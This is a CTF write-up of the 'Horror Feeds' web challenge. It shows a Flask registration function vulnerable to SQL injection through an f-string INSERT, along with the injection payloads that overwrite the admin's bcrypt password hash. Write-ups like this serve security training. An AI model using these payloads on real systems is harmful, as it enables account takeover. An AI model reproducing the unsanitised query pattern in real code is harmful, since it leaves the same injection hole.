# CTFname - Horror Feeds

* **Category:** Category
* **Points:** 200

## Challenge

> An unknown entity has taken over every screen worldwide and is broadcasting this haunted feed that introduces paranormal activity to random internet-accessible CCTV devices. Could you take down this streaming service?

## Solution
```python
./web_horror_feeds/challenge/application/database.py

def register(username, password):
    exists = query_db('SELECT * FROM users WHERE username = %s', (username,))
   
    if exists:
        return False
    
    hashed = generate_password_hash(password)

    query_db(f'INSERT INTO users (username, password) VALUES ("{username}", "{hashed}")')
    mysql.connection.commit()

    return True
```

* As shown above there is a `register()` function which requires the paramaters `(username, password)` so it can be used in the query to store credentials to a database.
* The vulnerability occurs as there is no sanitization of the `username` therefore makes it possible to execute malicious SQL statements

![image](https://user-images.githubusercontent.com/78451563/198285821-bb4f404b-9c25-4976-bc96-ae7db112453d.png)

* To try login as admin we could try to update the admin's bcrypt password as creating another admin entry wouldn't work
</br>

### SQLi exploitation steps

![image](https://user-images.githubusercontent.com/78451563/198289332-b30893d0-8bb9-49af-b75b-c3bb43234e5e.png)

1. Firstly i ended the firstly query to make it easier:
```sql
admin","password");-- -
```
2. Now to create our custom password by using the `generate_password_hash()`:


```python
def generate_password_hash(password):
    salt = bcrypt.gensalt()
    return bcrypt.hashpw(password.encode(), salt).decode()

def verify_hash(password, passhash):
    return bcrypt.checkpw(password.encode(), passhash.encode())
```
* The server verfies our password using `bcrypt.checkpw` which involves the comparison of the already hashed stored password and the hashed entered password.

![image](https://user-images.githubusercontent.com/78451563/198292904-6832a28a-f3c7-4679-9a69-ff4a80d3d3ff.png)

* We can forge a password by utilising the `generate_password_hash(password)` function

4. Now to update the admins bcrypt password. I used `UPDATE` to change the admin's password and `COMMIT` to save the changes:

![image](https://user-images.githubusercontent.com/78451563/198295460-ebb27271-0f2e-48a3-82b2-be162b4cf988.png)

```sql
UPDATE users SET password='$2b$12$/SM/o3oxLx.rpLNtBrhrkOCXxK/myFjO7DsE83Xws95RSy8j8mjN6' WHERE username='admin'; COMMIT;-- -
```
5. Now to send to the server:

![image](https://user-images.githubusercontent.com/78451563/198296946-d034e2e8-6475-4daa-82c7-9a1310bc02aa.png)

![image](https://user-images.githubusercontent.com/78451563/198297003-93da0bb4-28e2-44d0-ac93-3ca2bbede074.png)

* While this does update the admin's password we get this error `Commands out of sync; you can't run this command now` meaning:
```
If you get Commands out of sync; you can’t run this command now in your client code, you are calling client functions in the wrong order.
```
* To resolve this error i used the `ON DUPLICATE KEY UPDATE` query.

[Payload Query Reference](https://chartio.com/resources/tutorials/how-to-insert-if-row-does-not-exist-upsert-in-mysql/)

```sql
ON DUPLICATE KEY UPDATE username='admin',password='$2b$12$XFj7IPgUFo4kI06hG9H5jOpoRPH3N5xqwF.tWdyefOJwiUOR6KCfa'
```

![image](https://user-images.githubusercontent.com/78451563/198306235-edbda84e-9564-461e-8102-e1da3745d3b8.png)

![image](https://user-images.githubusercontent.com/78451563/198306332-3b666681-382d-40b3-b736-8dd644feb4a1.png)




```
Flag: HTB{N3ST3D_QU3R1E5_AR3_5CARY!!!}
```
